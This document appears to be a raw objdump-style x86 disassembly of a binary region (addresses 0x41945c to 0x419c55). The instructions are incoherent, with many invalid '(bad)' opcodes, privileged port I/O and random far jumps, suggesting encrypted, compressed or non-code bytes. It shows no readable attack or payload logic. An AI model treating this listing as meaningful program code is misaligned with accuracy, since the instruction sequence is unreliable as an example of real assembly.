  41945c:	xor    eax,0xb54814bb
  419461:	sbb    DWORD PTR [ebp+0x386a7a85],edx
  419467:	xchg   DWORD PTR [edx+0x55d81392],esi
  41946d:	jle    0x419476
  41946f:	jecxz  0x4194b0
  419471:	retf   
  419472:	inc    eax
  419473:	or     eax,0x59ce5bce
  419478:	ffree  st(2)
  41947a:	cwde   
  41947b:	(bad)  
  41947c:	cmp    ch,BYTE PTR [ebp-0x75]
  41947f:	ror    DWORD PTR [ecx-0x3d],0xf7
  419483:	data16 int3 
  419485:	mov    dh,0xff
  419487:	call   0x3d3a4cae
  41948c:	popa   
  41948d:	out    0x6c,al
  41948f:	test   DWORD PTR [ecx+ebp*2-0x5a23e767],edi
  419496:	jecxz  0x419448
  419498:	jle    0x41942a
  41949a:	call   0xce76:0x85c088ae
  4194a1:	rol    BYTE PTR [ecx-0x3f],1
  4194a4:	xchg   ebx,eax
  4194a5:	mov    ss,WORD PTR [edx+0x5009e0c2]
  4194ab:	out    0x58,eax
  4194ad:	ss jp  0x4194e0
  4194b0:	sub    al,0x4d
  4194b2:	sbb    edx,DWORD PTR [esp+ebp*2-0x25]
  4194b6:	sub    DWORD PTR [esi+ebp*4-0x63],ebp
  4194ba:	daa    
  4194bb:	icebp  
  4194bc:	jmp    FWORD PTR [eax+0x60]
  4194bf:	mov    ecx,0x64272f77
  4194c4:	test   BYTE PTR [edx+ebx*1-0x18],ah
  4194c8:	jp     0x419472
  4194ca:	ffree  st(2)
  4194cc:	out    dx,eax
  4194cd:	sub    eax,0xa27bfc2a
  4194d2:	mov    bl,0x1f
  4194d4:	test   BYTE PTR [ecx-0x8],al
  4194d7:	(bad)  
  4194d8:	fdiv   QWORD PTR [ecx-0x7c]
  4194db:	or     BYTE PTR [ebp-0x3f554fb9],dh
  4194e1:	mov    dh,0x48
  4194e3:	cmp    eax,0x77714a2f
  4194e8:	fdivr  DWORD PTR [edx+0x8]
  4194eb:	sbb    esp,esp
  4194ed:	mov    dh,0xad
  4194ef:	dec    edi
  4194f0:	lds    esp,FWORD PTR [ebx+0x35]
  4194f3:	jbe    0x4194f7
  4194f5:	repz jp 0x41947b
  4194f8:	test   eax,0xc8eb0d4
  4194fd:	(bad)  
  4194fe:	retf   0x6e60
  419501:	retf   0xf609
  419504:	dec    ecx
  419505:	or     bh,BYTE PTR [edx-0x6a]
  419508:	cmp    BYTE PTR [eax-0x69dc43e7],bh
  41950e:	(bad)  
  41950f:	out    dx,eax
  419510:	add    BYTE PTR [edx-0x1a],al
  419513:	jle    0x419520
  419515:	scas   al,BYTE PTR es:[edi]
  419516:	popf   
  419517:	mov    al,ds:0x14ed9b8f
  41951c:	inc    ebx
  41951d:	mov    BYTE PTR [esi+0x1fc0555a],al
  419523:	jne    0x41955b
  419525:	jge    0x41953e
  419527:	jge    0x41959c
  419529:	into   
  41952a:	xchg   edx,eax
  41952b:	and    DWORD PTR [ecx+0x654aab1e],0x220051ff
  419535:	and    al,bh
  419537:	(bad)  
  419538:	inc    eax
  419539:	mov    edx,0x317c5323
  41953e:	pop    ebp
  41953f:	pop    edi
  419540:	mov    al,bh
  419542:	push   es
  419543:	fisttp QWORD PTR [edi]
  419545:	mov    al,0x72
  419547:	sbb    DWORD PTR [esi+0x67],esp
  41954a:	push   edi
  41954b:	inc    edi
  41954c:	in     eax,dx
  41954d:	ins    DWORD PTR es:[edi],dx
  41954e:	mov    DWORD PTR [edx+0x37],ebp
  419551:	or     cl,BYTE PTR [ecx]
  419553:	sbb    BYTE PTR [eax+ecx*1+0x5a980559],0xc6
  41955b:	jmp    0xa366:0xf467be10
  419562:	and    eax,0x328244aa
  419567:	mov    ecx,0x9d25562e
  41956c:	mov    es,WORD PTR [edi-0x17ba7fd1]
  419572:	and    BYTE PTR [ecx],bh
  419574:	sbb    eax,0xcde41c56
  419579:	pop    es
  41957a:	aas    
  41957b:	mov    esi,0x489416b9
  419580:	jae    0x419506
  419582:	xchg   edi,eax
  419583:	xor    eax,0x62dfea7e
  419588:	dec    ecx
  419589:	mov    WORD PTR [ebp-0xb396f9b],?
  41958f:	xchg   edi,eax
  419590:	mov    BYTE PTR [eax+ebp*2+0x62],dh
  419594:	dec    edi
  419595:	fwait
  419596:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419597:	sbb    BYTE PTR [edi],bh
  419599:	pop    ecx
  41959a:	adc    ch,ch
  41959c:	inc    edi
  41959d:	inc    ebx
  41959e:	bound  eax,QWORD PTR [esi-0x728c4ba9]
  4195a4:	mov    edi,0x526b630
  4195a9:	(bad)  
  4195aa:	div    BYTE PTR [esi+edi*2]
  4195ad:	ror    DWORD PTR [edi-0x104d806e],1
  4195b3:	cmp    ebp,edx
  4195b5:	sbb    ah,BYTE PTR [esi]
  4195b7:	or     DWORD PTR [ecx-0x13],edi
  4195ba:	int3   
  4195bb:	xchg   BYTE PTR [eax-0x5c19c4bb],dh
  4195c1:	push   0xffffff86
  4195c3:	and    al,0xfd
  4195c5:	inc    esp
  4195c6:	push   ebx
  4195c7:	mov    bl,0x39
  4195c9:	test   eax,0x654419dc
  4195ce:	push   edi
  4195cf:	jae    0x4195fc
  4195d1:	or     BYTE PTR [ebp+edx*4+0x715b12ae],dh
  4195d8:	adc    al,al
  4195da:	sub    al,0xbe
  4195dc:	(bad)  
  4195dd:	push   ecx
  4195de:	test   BYTE PTR [esi],bl
  4195e0:	push   cs
  4195e1:	rcr    DWORD PTR [ecx-0x3c],1
  4195e4:	adc    eax,0x6a6bc6d5
  4195e9:	cmp    eax,0xca2838d7
  4195ee:	push   cs
  4195ef:	or     eax,0xecae818e
  4195f4:	jge    0x419579
  4195f6:	sub    bl,BYTE PTR [eax-0xe08b76f]
  4195fc:	xor    BYTE PTR ds:0xc539136e,dl
  419602:	xchg   edx,eax
  419603:	les    ebx,FWORD PTR [ecx+0xa]
  419606:	cmp    DWORD PTR [edi-0x1c],esi
  419609:	ds pop ss
  41960b:	dec    esi
  41960c:	test   eax,0xd28d4362
  419611:	sbb    DWORD PTR [esi+0x60],0x56
  419615:	jns    0x4195d9
  419617:	add    ecx,DWORD PTR [ebx+0x4a2974b9]
  41961d:	jne    0x4195df
  41961f:	pop    ss
  419620:	gs push ds
  419622:	lock sbb bh,bh
  419625:	push   ebp
  419626:	jmp    0x486ac657
  41962b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41962c:	out    dx,al
  41962d:	pop    edx
  41962e:	les    ebx,FWORD PTR ds:[edi+0x69a26277]
  419635:	xchg   ebx,eax
  419636:	inc    esi
  419637:	xor    al,0x55
  419639:	jbe    0x419634
  41963b:	jo     0x41967a
  41963d:	and    dl,BYTE PTR [edi]
  41963f:	sbb    ch,ah
  419641:	inc    ebp
  419642:	adc    DWORD PTR [ebp+0x6f90ed71],esi
  419648:	retf   
  419649:	xchg   ebx,eax
  41964a:	add    al,BYTE PTR [eax+0x2a]
  41964d:	cs jmp 0xe4c95d8f
  419653:	mov    eax,0x1caaaf8c
  419658:	fidivr DWORD PTR [edi+0x330e47cf]
  41965e:	jns    0x4196ae
  419660:	cmc    
  419661:	(bad)  
  419662:	fcom   DWORD PTR [ebp-0x21]
  419665:	inc    ecx
  419666:	mov    ch,0xad
  419668:	out    dx,eax
  419669:	dec    eax
  41966a:	pop    es
  41966b:	js     0x41967f
  41966d:	in     eax,0x6a
  41966f:	mov    esp,0x2b2afd29
  419674:	dec    eax
  419675:	lods   eax,DWORD PTR ds:[esi]
  419676:	shr    ah,cl
  419678:	pop    ss
  419679:	jge    0x4196f8
  41967b:	repnz push edx
  41967d:	cmp    eax,0xb3d0cc2d
  419682:	xchg   ebx,eax
  419683:	xor    DWORD PTR [ebx-0x2d],eax
  419686:	mov    ecx,0x1f4527d9
  41968b:	pop    esp
  41968c:	pop    eax
  41968d:	ins    DWORD PTR es:[edi],dx
  41968e:	pushf  
  41968f:	imul   ebp,edx,0xfd29530c
  419695:	dec    edx
  419696:	jecxz  0x419687
  419698:	out    0x54,al
  41969a:	mov    DWORD PTR [eax+0x40806aaf],ecx
  4196a0:	shl    esp,cl
  4196a2:	call   0x7d24:0xceeff80b
  4196a9:	dec    esp
  4196aa:	xor    bl,BYTE PTR [edx+0x4ef44d87]
  4196b0:	lahf   
  4196b1:	inc    ecx
  4196b2:	mov    ds:0x5eb89eab,al
  4196b7:	daa    
  4196b8:	stos   DWORD PTR es:[edi],eax
  4196b9:	aam    0xe7
  4196bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196bc:	and    al,0xcf
  4196be:	mov    bh,0x62
  4196c0:	loope  0x4196e1
  4196c2:	iret   
  4196c3:	dec    edi
  4196c4:	dec    esp
  4196c5:	into   
  4196c6:	neg    ecx
  4196c8:	dec    ebx
  4196c9:	push   ss
  4196ca:	jo     0x419668
  4196cc:	or     eax,0x8115f7a3
  4196d1:	or     edi,0xf512081d
  4196d7:	idiv   DWORD PTR [edi]
  4196d9:	in     eax,dx
  4196da:	inc    ecx
  4196db:	icebp  
  4196dc:	in     al,dx
  4196dd:	or     BYTE PTR [esi+0x5b60c3],bl
  4196e3:	jmp    0xb287:0xaa52c2c
  4196ea:	pop    ebp
  4196eb:	loop   0x419721
  4196ed:	mov    dh,0x1b
  4196ef:	nop
  4196f0:	aas    
  4196f1:	sbb    cl,BYTE PTR [ecx]
  4196f3:	pop    ss
  4196f4:	sub    al,0xd0
  4196f6:	cmp    al,0x6d
  4196f8:	fmul   st(7),st
  4196fa:	int3   
  4196fb:	repnz xor esp,DWORD PTR [ebx+0x69af93b2]
  419702:	xchg   edx,eax
  419703:	repnz pop es
  419705:	hlt    
  419706:	mov    ah,0xf2
  419708:	jle    0x41972d
  41970a:	mov    DWORD PTR [edi-0x72b9a418],esp
  419710:	and    ebp,DWORD PTR [ecx+0x7a741013]
  419716:	fmul   DWORD PTR [ecx]
  419718:	inc    ebx
  419719:	push   edi
  41971a:	inc    ebx
  41971b:	mov    ds:0x8fd217ae,al
  419720:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419721:	mov    eax,0xa69f34d0
  419726:	jne    0x41977b
  419728:	pop    ebp
  419729:	and    eax,0x21a215ff
  41972e:	icebp  
  41972f:	xchg   edx,eax
  419730:	or     al,0x9b
  419732:	xor    ch,BYTE PTR [esp+ecx*2]
  419735:	mov    ds:0xa90d4576,eax
  41973a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41973b:	ins    BYTE PTR es:[edi],dx
  41973c:	mov    dh,0xc1
  41973e:	retf   
  41973f:	adc    DWORD PTR [edi-0x7a],ebp
  419742:	adc    ecx,ebx
  419744:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419745:	out    0xc9,eax
  419747:	jp     0x41978a
  419749:	or     ch,BYTE PTR [ecx-0x67]
  41974c:	mov    ch,0x8b
  41974e:	cld    
  41974f:	repnz in al,0x2c
  419752:	aad    0xa0
  419754:	cmc    
  419755:	retf   0x613c
  419758:	in     eax,0xec
  41975a:	imul   ebx,DWORD PTR ds:0xd8f106bf,0x4a
  419761:	jmp    0x22ff:0x1d74cd08
  419768:	ror    DWORD PTR [edi*2+0x4f42a00e],0xf4
  419770:	cmp    BYTE PTR [edx+edi*4],al
  419773:	lods   al,BYTE PTR ds:[esi]
  419774:	enter  0x2ecc,0x16
  419778:	retf   
  419779:	scas   eax,DWORD PTR es:[edi]
  41977a:	dec    eax
  41977b:	mov    ds:0xb44012c0,eax
  419780:	mov    esi,0x33d71e1c
  419785:	int3   
  419786:	inc    esp
  419787:	call   FWORD PTR [eax-0x5]
  41978a:	stos   DWORD PTR es:[edi],eax
  41978b:	xor    eax,edi
  41978d:	(bad)  
  41978e:	mov    BYTE PTR [eax+eiz*2],0xde
  419792:	test   DWORD PTR [edx],edx
  419794:	or     BYTE PTR [ebp+0x4057a226],bh
  41979a:	outs   dx,DWORD PTR ds:[esi]
  41979b:	out    0xe1,eax
  41979d:	dec    edx
  41979e:	push   edx
  41979f:	cdq    
  4197a0:	add    BYTE PTR [edi+edx*2-0x50a1aa59],al
  4197a7:	loopne 0x419743
  4197a9:	sti    
  4197aa:	inc    edi
  4197ab:	dec    esp
  4197ac:	sahf   
  4197ad:	lea    ebp,[edx-0x6e52dcb8]
  4197b3:	or     DWORD PTR [edx],edx
  4197b5:	fnstcw WORD PTR [esi+ebx*8-0x747f2128]
  4197bc:	add    BYTE PTR [esi+0x79],dh
  4197bf:	ror    DWORD PTR [eax+0xf],0xdf
  4197c3:	inc    esp
  4197c4:	push   edx
  4197c5:	sub    al,0xed
  4197c7:	mov    edx,0xf84624db
  4197cc:	pop    ebp
  4197cd:	shl    cl,0x8e
  4197d0:	push   ecx
  4197d1:	(bad)  
  4197d2:	outs   dx,BYTE PTR ds:[esi]
  4197d3:	cli    
  4197d4:	jle    0x41977c
  4197d6:	adc    DWORD PTR ds:0x2c0f1b2d,0x2d
  4197dd:	hlt    
  4197de:	jl     0x4197d1
  4197e0:	xchg   edx,eax
  4197e1:	js     0x419837
  4197e3:	add    BYTE PTR [ebx+edi*8+0x7],ch
  4197e7:	hlt    
  4197e8:	jle    0x4197ad
  4197ea:	adc    al,BYTE PTR [ebx]
  4197ec:	int3   
  4197ed:	imul   BYTE PTR [edi-0x6efd5327]
  4197f3:	in     al,dx
  4197f4:	stos   DWORD PTR es:[edi],eax
  4197f5:	les    ebx,FWORD PTR [ebp+0x53]
  4197f8:	stc    
  4197f9:	push   ss
  4197fa:	xchg   ebx,eax
  4197fb:	icebp  
  4197fc:	adc    DWORD PTR [eax+0x7ca50b2c],ebp
  419802:	imul   eax,ebp,0x5a
  419805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419806:	xchg   esi,eax
  419807:	mov    ebp,ebx
  419809:	pop    ebx
  41980a:	mov    ah,0x38
  41980c:	jge    0x4197f2
  41980e:	sahf   
  41980f:	sbb    BYTE PTR ds:0xe3d5ad0b,dh
  419815:	pop    ebx
  419816:	iret   
  419817:	pop    esp
  419818:	and    dl,BYTE PTR [eax-0x5c]
  41981b:	xor    eax,0x4c38b331
  419820:	stos   BYTE PTR es:[edi],al
  419821:	add    ecx,0xffffffa3
  419824:	pop    ds
  419825:	fld    QWORD PTR [ebx-0x16e2f69a]
  41982b:	push   ecx
  41982c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41982d:	jb     0x419854
  41982f:	jns    0x4197cb
  419831:	mov    ebx,0x871874b3
  419836:	pushf  
  419837:	rol    dh,cl
  419839:	mov    BYTE PTR [ecx-0x47],bl
  41983c:	mov    ah,BYTE PTR [eax-0x22]
  41983f:	and    eax,0xc79333c9
  419844:	jecxz  0x419805
  419846:	cs xchg edi,eax
  419848:	and    al,0x82
  41984a:	sbb    bh,dl
  41984c:	and    ecx,ebx
  41984e:	xchg   edi,eax
  41984f:	jb     0x419838
  419851:	and    ch,BYTE PTR [ebx]
  419853:	(bad)
  419858:	int    0x5b
  41985a:	xchg   edx,eax
  41985b:	sahf   
  41985c:	pop    edx
  41985d:	cmp    BYTE PTR [edx-0x14a9bed4],ah
  419863:	jns    0x41982e
  419865:	sub    eax,0xb674da4f
  41986a:	jnp    0x419895
  41986c:	jmp    0x419837
  41986e:	xchg   ecx,eax
  41986f:	and    al,0xdf
  419871:	mov    ebx,0x7c0825ca
  419876:	retf   
  419877:	mov    ch,0xd1
  419879:	sub    al,0x62
  41987b:	adc    eax,0xc856ea94
  419880:	js     0x419820
  419882:	xchg   edi,eax
  419883:	add    ch,ah
  419885:	clc    
  419886:	xor    eax,0x77d3bc7c
  41988b:	call   0x6bbb:0x476c0855
  419892:	(bad)  
  419893:	mov    al,ds:0x8e0f63da
  419898:	dec    esi
  419899:	aad    0x91
  41989b:	loope  0x41990d
  41989d:	dec    esp
  41989e:	or     BYTE PTR [edx+0x27dc3b31],bl
  4198a4:	pop    ds
  4198a5:	bound  ebp,QWORD PTR [ebx+eiz*1+0x1c]
  4198a9:	adc    BYTE PTR [ebp+0x66],0xd9
  4198ad:	and    bl,dh
  4198af:	iret   
  4198b0:	pop    es
  4198b1:	and    DWORD PTR [ebp-0x27],0x65
  4198b5:	enter  0x484c,0xc0
  4198b9:	sti    
  4198ba:	pusha  
  4198bb:	push   edx
  4198bc:	clc    
  4198bd:	jnp    0x419929
  4198bf:	enter  0x90b1,0xd
  4198c3:	(bad)  
  4198c4:	xchg   BYTE PTR es:[ecx-0x39fb6e50],bh
  4198cb:	xchg   ecx,eax
  4198cc:	in     al,0xfd
  4198ce:	jbe    0x4198be
  4198d0:	sbb    BYTE PTR ds:[eax+0x7b],0x60
  4198d5:	ret    
  4198d6:	dec    esi
  4198d7:	stc    
  4198d8:	jbe    0x419921
  4198da:	loopne 0x419871
  4198dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198dd:	rep lods al,BYTE PTR ds:[esi]
  4198df:	addr16 iret 
  4198e1:	jns    0x41993e
  4198e3:	out    0xab,eax
  4198e5:	shr    al,cl
  4198e7:	fdiv   QWORD PTR [eax-0x5c66f8c6]
  4198ed:	inc    edi
  4198ee:	mov    eax,ds:0x1bfcea28
  4198f3:	xor    eax,0x2a8ec1fc
  4198f8:	add    al,0x23
  4198fb:	ds pop ecx
  4198fd:	cs pop es
  4198ff:	mov    cl,0x7e
  419901:	and    dl,BYTE PTR [ecx+ebx*2]
  419904:	call   0xf0cb:0x5c06afe9
  41990b:	cmp    eax,0x3827b0cf
  419910:	mov    ds:0x2552a95a,al
  419915:	mov    cl,0x38
  419917:	cmp    eax,0x6fe4aa5b
  41991c:	pushf  
  41991d:	sbb    DWORD PTR [ebx],ecx
  41991f:	(bad)  
  419920:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  419922:	std    
  419923:	fisub  WORD PTR [ebx]
  419925:	add    al,0xe0
  419927:	in     al,0x93
  419929:	fxch   st(1)
  41992b:	mov    esp,edx
  41992d:	(bad)  
  41992e:	push   ebx
  41992f:	sbb    DWORD PTR [ecx-0x24d4d956],esi
  419935:	pop    esi
  419936:	hlt    
  419937:	pop    ebx
  419938:	and    DWORD PTR [edx+0x235ea7e7],ebx
  41993e:	daa    
  41993f:	addr16 xor dl,bh
  419942:	cmp    al,0xc9
  419944:	js     0x419918
  419946:	ins    BYTE PTR es:[edi],dx
  419947:	jmp    0x41997f
  419949:	leave  
  41994a:	mov    gs,WORD PTR [esi-0x339a093b]
  419950:	je     0x41998b
  419952:	rcr    BYTE PTR [eax-0x7e6d3c54],1
  419958:	sbb    DWORD PTR ds:0xaf713521,edi
  41995e:	and    ebx,esi
  419960:	pop    es
  419961:	ja     0x419962
  419963:	scas   eax,DWORD PTR es:[edi]
  419964:	push   es
  419965:	xchg   ebp,eax
  419966:	sbb    eax,0x90c8afc9
  41996b:	adc    BYTE PTR [esi+0x7a6b0ff],bh
  419971:	fwait
  419972:	lock xor dh,BYTE PTR ds:0xc9727acf
  419979:	xchg   esp,eax
  41997a:	stos   DWORD PTR es:[edi],eax
  41997b:	xor    eax,0xc546afcb
  419980:	add    DWORD PTR [eax+0x5703fbc5],eax
  419986:	and    esi,esi
  419988:	mov    DWORD PTR [esi+0x6e],ebp
  41998b:	retf   
  41998c:	xor    esi,ecx
  41998e:	scas   al,BYTE PTR es:[edi]
  41998f:	test   al,0xa2
  419991:	add    al,0xcf
  419993:	mov    eax,0x77e72dd9
  419998:	ret    0x7638
  41999b:	hlt    
  41999c:	imul   ecx,DWORD PTR [ebx],0x7
  41999f:	pop    edx
  4199a0:	fsub   st,st(2)
  4199a2:	cli    
  4199a3:	jno    0x419931
  4199a5:	mov    al,ds:0x66d1bae8
  4199aa:	fcomi  st,st(1)
  4199ac:	inc    esi
  4199ad:	and    dl,0x2
  4199b0:	int    0x5a
  4199b2:	push   ss
  4199b3:	mov    bh,0xf8
  4199b5:	inc    DWORD PTR [edi+ebp*1]
  4199b8:	cmp    DWORD PTR [esi+ecx*8-0x2],edi
  4199bc:	in     al,dx
  4199bd:	jecxz  0x4199b4
  4199bf:	jle    0x4199d2
  4199c1:	push   ebp
  4199c2:	inc    edx
  4199c3:	jg     0x419a3d
  4199c5:	outs   dx,BYTE PTR ds:[esi]
  4199c6:	daa    
  4199c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199c8:	cli    
  4199c9:	or     DWORD PTR [edi+0x5aca2f3],edi
  4199cf:	or     ecx,DWORD PTR [edi]
  4199d1:	ja     0x4199e6
  4199d3:	adc    eax,0xb14ce09a
  4199d8:	fnstsw WORD PTR [esi+0x53]
  4199db:	inc    ebx
  4199dc:	xchg   BYTE PTR [edi],dh
  4199de:	call   0x3980:0xf6d5ba55
  4199e5:	sub    DWORD PTR [ebp-0x58],0x49
  4199e9:	call   0xf192:0x7a78f3a3
  4199f0:	push   0xa2d414fa
  4199f5:	jg     0x419a07
  4199f7:	pop    ebx
  4199f8:	push   es
  4199f9:	add    al,0x8
  4199fb:	push   ds
  4199fc:	push   es
  4199fd:	loop   0x419a40
  4199ff:	test   eax,0xa78f85d3
  419a04:	mov    esp,DWORD PTR gs:[eax]
  419a07:	xchg   ebx,eax
  419a08:	test   eax,0x6f44fbc3
  419a0d:	mov    cl,0x9c
  419a0f:	icebp  
  419a10:	cli    
  419a11:	clc    
  419a12:	adc    DWORD PTR [edi+edx*8-0x27],edi
  419a16:	(bad)  
  419a17:	or     eax,0xd772e805
  419a1c:	push   cs
  419a1d:	test   DWORD PTR [ecx+edi*1],0x1d6fc854
  419a24:	mov    DWORD PTR [ecx-0x21],0x13b48d28
  419a2b:	or     al,0x7b
  419a2d:	dec    eax
  419a2e:	test   eax,0x9cdf461c
  419a33:	mov    ebx,0x1e223155
  419a38:	dec    edi
  419a39:	sbb    DWORD PTR [esi+ecx*8-0x34],esi
  419a3d:	es (bad) 
  419a3f:	popa   
  419a40:	sbb    BYTE PTR [ebp+0x44],0x81
  419a44:	in     eax,0x60
  419a46:	clc    
  419a47:	adc    BYTE PTR [esi+0x56],al
  419a4a:	add    eax,0xcc4b231f
  419a4f:	adc    bl,dl
  419a51:	xchg   ebp,eax
  419a52:	inc    ebx
  419a53:	xlat   BYTE PTR ds:[ebx]
  419a54:	xchg   edx,eax
  419a55:	cmp    BYTE PTR ds:0xef78e195,dl
  419a5b:	xlat   BYTE PTR ds:[ebx]
  419a5c:	xor    eax,0x70d342fa
  419a61:	dec    eax
  419a62:	adc    BYTE PTR [ecx-0x61],cl
  419a65:	dec    ebp
  419a66:	adc    eax,0xe4f73f1c
  419a6b:	ja     0x419a2d
  419a6d:	in     al,dx
  419a6e:	sbb    eax,0x6adf0315
  419a73:	sbb    dh,ah
  419a75:	xor    DWORD PTR ds:0xb84c2c93,edi
  419a7b:	fiadd  DWORD PTR [ecx]
  419a7d:	jle    0x419ab0
  419a7f:	data16 xlat BYTE PTR ds:[ebx]
  419a81:	in     eax,0xe7
  419a83:	mov    bl,0xa0
  419a85:	retf   
  419a86:	shl    DWORD PTR [esi],0x15
  419a89:	push   edx
  419a8a:	bound  esp,QWORD PTR [edx-0x53]
  419a8d:	ret    
  419a8e:	xchg   edi,eax
  419a8f:	add    ah,BYTE PTR [ecx+ecx*1+0x57a3c6ab]
  419a96:	leave  
  419a97:	mov    edi,0xf1c871eb
  419a9c:	pop    ds
  419a9d:	mov    eax,ds:0x3cbfc32b
  419aa2:	std    
  419aa3:	dec    ebx
  419aa4:	mov    al,ds:0x6992d065
  419aa9:	mov    eax,ds:0xc4856465
  419aae:	sar    BYTE PTR [esi-0x17],cl
  419ab1:	loop   0x419a51
  419ab3:	je     0x419abf
  419ab5:	and    esp,esp
  419ab7:	imul   edx,DWORD PTR cs:[edi],0x5686dc28
  419abe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419abf:	and    edi,DWORD PTR [esi+0x1cd8d789]
  419ac5:	or     bl,ah
  419ac7:	into   
  419ac8:	add    al,BYTE PTR [ecx+edi*2+0x40]
  419acc:	mov    dl,0x2b
  419ace:	test   eax,0xfe653c54
  419ad3:	jge    0x419ab8
  419ad5:	push   ebp
  419ad6:	not    BYTE PTR [esi+edx*4]
  419ad9:	cmp    ebp,DWORD PTR [edx]
  419adb:	xchg   DWORD PTR [edi-0x3e],edi
  419ade:	sti    
  419adf:	leave  
  419ae0:	sub    BYTE PTR [esi+ecx*1-0x5d],dh
  419ae4:	fwait
  419ae5:	lock xchg ecx,eax
  419ae7:	mov    edx,0x4c9f9509
  419aec:	push   eax
  419aed:	mov    edi,0x3b09eb67
  419af2:	and    ecx,0xffffffdf
  419af5:	iret   
  419af6:	aad    0x9a
  419af8:	jo     0x419ab9
  419afa:	adc    al,0x14
  419afc:	push   ss
  419afd:	test   DWORD PTR ss:[esi-0x6e24296],0xe063d7b3
  419b08:	mov    dh,0x5d
  419b0a:	or     cl,0x2a
  419b0d:	fadd   QWORD PTR [esi-0x7cf1ebe2]
  419b13:	jecxz  0x419a97
  419b15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b16:	out    dx,al
  419b17:	shl    eax,0x2
  419b1a:	loope  0x419b6b
  419b1c:	mov    BYTE PTR [ecx-0x3c],bl
  419b1f:	jo     0x419b5f
  419b21:	enter  0x4534,0x6
  419b25:	ret    0x5ba7
  419b28:	xor    al,0x9d
  419b2a:	lods   al,BYTE PTR ds:[esi]
  419b2b:	cdq    
  419b2c:	in     eax,0x7b
  419b2e:	push   ecx
  419b2f:	xor    al,0xbb
  419b31:	xchg   edi,eax
  419b32:	or     al,0x90
  419b34:	push   ds
  419b35:	and    al,BYTE PTR [esi+0x64]
  419b38:	dec    esi
  419b39:	(bad)  
  419b3a:	add    al,0x43
  419b3c:	and    eax,0xed7b8ca0
  419b41:	add    eax,0xa64496b9
  419b46:	mov    edi,0x70fe7f6a
  419b4b:	stos   BYTE PTR es:[edi],al
  419b4c:	fs mov ah,0x1c
  419b4f:	repz adc BYTE PTR cs:[ecx],bl
  419b53:	scas   eax,DWORD PTR es:[edi]
  419b54:	sbb    bl,BYTE PTR [edx]
  419b56:	adc    eax,0xb3ba733e
  419b5b:	add    DWORD PTR [ebp+0x5603e1db],edi
  419b61:	stos   DWORD PTR es:[edi],eax
  419b62:	aad    0x1a
  419b64:	and    eax,0xcc8c9358
  419b69:	xor    al,0x50
  419b6b:	rcl    BYTE PTR [edi+0x10],0xe0
  419b6f:	cs and al,0xeb
  419b72:	push   ecx
  419b73:	dec    edx
  419b74:	and    DWORD PTR [ebx-0x247910ab],esp
  419b7a:	cmp    ecx,DWORD PTR [eax]
  419b7c:	in     eax,dx
  419b7d:	div    DWORD PTR [esi]
  419b7f:	mov    ch,0x45
  419b81:	test   eax,0x2a7e016c
  419b86:	add    al,BYTE PTR [edx-0x76eedc9a]
  419b8c:	daa    
  419b8d:	pop    ds
  419b8e:	pop    ebp
  419b8f:	enter  0xddd6,0x29
  419b93:	mov    bl,0x6b
  419b95:	or     BYTE PTR [esi+0x7b],bh
  419b98:	mov    esp,0xbb5edda8
  419b9d:	das    
  419b9e:	cmp    DWORD PTR [ebx-0x2d],ecx
  419ba1:	sbb    al,BYTE PTR [esi-0x18ed4121]
  419ba7:	retf   
  419ba8:	nop
  419ba9:	and    al,bl
  419bab:	bound  ebx,QWORD PTR [edx+0x1]
  419bae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419baf:	jp     0x419bb8
  419bb1:	test   dl,0xbc
  419bb4:	and    BYTE PTR [edx+0x6bf5487d],0x99
  419bbb:	dec    edx
  419bbc:	adc    ebx,DWORD PTR [edx-0x6500220]
  419bc2:	mov    ch,0x2f
  419bc4:	aad    0xfe
  419bc6:	pop    ebx
  419bc7:	setb   BYTE PTR [ebp+0x48]
  419bcb:	sub    ah,BYTE PTR [esi]
  419bcd:	scas   al,BYTE PTR es:[edi]
  419bce:	mov    ds:0x228f4c62,eax
  419bd3:	out    0xbe,eax
  419bd5:	cdq    
  419bd6:	mov    esp,0x60bd8d02
  419bdb:	loopne 0x419c26
  419bdd:	lock xchg esp,eax
  419bdf:	jnp    0x419bc5
  419be1:	push   esp
  419be2:	jbe    0x419c42
  419be4:	sub    dh,BYTE PTR [eax+0x51]
  419be7:	mov    edi,0x6c7fea65
  419bec:	int3   
  419bed:	add    al,0x9e
  419bef:	test   BYTE PTR [edx+0x2],bh
  419bf2:	dec    edx
  419bf3:	mov    dh,BYTE PTR [eax-0x63]
  419bf6:	(bad)  
  419bf7:	sub    ah,cl
  419bf9:	imul   esi,DWORD PTR [esi+0x7d3b865a],0xe37878af
  419c03:	daa    
  419c04:	out    0x31,eax
  419c06:	dec    ecx
  419c07:	in     eax,0x3d
  419c09:	js     0x419bd5
  419c0b:	ror    DWORD PTR [edi+0x2f372513],cl
  419c11:	(bad)  
  419c12:	das    
  419c13:	inc    BYTE PTR [ecx+0x7844c670]
  419c19:	mov    esi,0x2c1d315d
  419c1e:	out    0x69,eax
  419c20:	cmp    DWORD PTR [eax],eax
  419c22:	xchg   ecx,ecx
  419c24:	cli    
  419c25:	and    BYTE PTR [ebx],bh
  419c27:	xor    BYTE PTR [eax-0x2cbbfb34],dh
  419c2d:	arpl   WORD PTR [edx+0x62],bx
  419c30:	pop    edi
  419c31:	xor    BYTE PTR [ebx],dl
  419c33:	mov    ch,0x1
  419c35:	push   eax
  419c36:	(bad)  
  419c37:	std    
  419c38:	mov    dl,al
  419c3a:	jbe    0x419be4
  419c3c:	adc    dl,BYTE PTR [edx]
  419c3e:	enter  0xfba9,0xd
  419c42:	mov    ss:0xe0b0be9a,eax
  419c48:	jmp    0x419c0a
  419c4a:	pop    edi
  419c4b:	imul   ebx,ebp,0xf3055050
  419c51:	addr16 ret 
  419c53:	loope  0x419bfe
  419c55:	xor    al,0x59
